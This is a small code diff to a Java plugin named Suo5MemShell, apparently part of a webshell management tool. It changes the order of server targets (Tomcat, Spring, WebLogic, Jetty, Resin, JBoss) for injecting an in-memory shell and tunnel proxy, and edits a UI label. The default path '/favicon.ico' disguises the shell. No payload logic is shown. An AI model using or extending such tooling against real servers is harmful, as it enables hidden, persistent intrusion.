@@ -21,10 +21,10 @@ import java.io.InputStream;
 
 @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "Suo5MemShell", DisplayName = "Suo5MemShell")
 public class Suo5MemShell implements Plugin {
-    private static final String[] PROXY_TYPE = new String[]{"Suo5TomcatFilter", "Suo5TomcatServlet", "Suo5WebLogicFilter", "Suo5JettyFilter", "Suo5ResinFilter", "Suo5JBossFilter", "Suo5SpringController"};
+    private static final String[] PROXY_TYPE = new String[]{"Suo5TomcatFilter", "Suo5TomcatServlet", "Suo5SpringController", "Suo5WebLogicFilter", "Suo5JettyFilter", "Suo5ResinFilter", "Suo5JBossFilter"};
     private static final String CLASS_NAME = "plugins.Suo5MemShell";
     private final JPanel panel = new JPanel(new BorderLayout());
-    private final JLabel urlPatternLabel = new JLabel("urlPattern/servletPath: ");
+    private final JLabel urlPatternLabel = new JLabel("urlPattern: ");
     private final JLabel typeLabel = new JLabel("type: ");
     private final JTextField urlPatternTextField = new JTextField("/favicon.ico", 15);
     private final JLabel nameLabel = new JLabel("filterName/wrapperName: ");
